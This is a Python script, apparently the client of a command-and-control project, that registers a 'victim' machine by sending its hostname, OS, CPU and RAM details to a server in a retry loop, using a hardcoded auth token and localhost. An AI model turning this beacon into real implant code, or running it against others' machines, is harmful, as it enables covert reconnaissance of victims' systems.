import subprocess
import uuid
import platform
import os
import re
import psutil
import json
from time import sleep
from http.client import HTTPConnection
from http import HTTPStatus


class Victim:
    def __init__(self, auth_token: str, server_address: str, port_number: int = 80):
        # Establish a connection with the server
        self.connection = HTTPConnection(server_address, port_number)
        self.id = uuid.getnode()
        self.client_type = "victim"
        self.default_header = {"Client-Id": self.id, "Client-Type": self.client_type, "Authorization": f"Basic {auth_token}"}

    @staticmethod
    def get_processor_name():
        if platform.system() == "Windows":
            return platform.processor()
        elif platform.system() == "Darwin":
            os.environ['PATH'] = os.environ['PATH'] + os.pathsep + '/usr/sbin'
            command = ["sysctl", "-n", "machdep.cpu.brand_string"]
            return subprocess.check_output(command).strip().decode("utf-8")
        elif platform.system() == "Linux":
            command = "cat /proc/cpuinfo"
            all_info = subprocess.check_output(command, shell=True).decode().strip()
            for line in all_info.split("\n"):
                if "model name" in line:
                    return re.sub(".*model name.*:", "", line, 1)
        return ""

    def send_computer_info(self):
        """Send victims computer information to the server."""
        # Obtain necessary computer information
        computer_information = {
            "host_name": platform.uname().node,
            "os": platform.platform(),
            "arch": platform.machine(),
            "cpu": self.get_processor_name(),
            "ram": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))}GB"
        }
        # Create a POST request infinitely until the server sends back
        # the 201 status code
        status_code = None
        while status_code != HTTPStatus.CREATED and status_code != HTTPStatus.OK:
            # We first need to reformat the data to include the victim_id
            # encoded_computer_specs = json.dumps(computer_information)
            data = json.dumps(computer_information)
            self.connection.request("PUT", "/victim_computer_specs", body=data, headers={**self.default_header, "Content-type": "application/json", "Content-Length": str(len(data.encode("utf-8")))})

            response = self.connection.getresponse()
            status_code = response.status
            print(f"{response.status} {response.reason}")
            sleep(2)

        print("Computer info has been successfully sent to the server")


victim = Victim("NDM0Y2FkMGQtMjI5Yi00NGU4LTg2ZGItZDRjNGI4MWY4N2Zi", "localhost")
victim.send_computer_info()
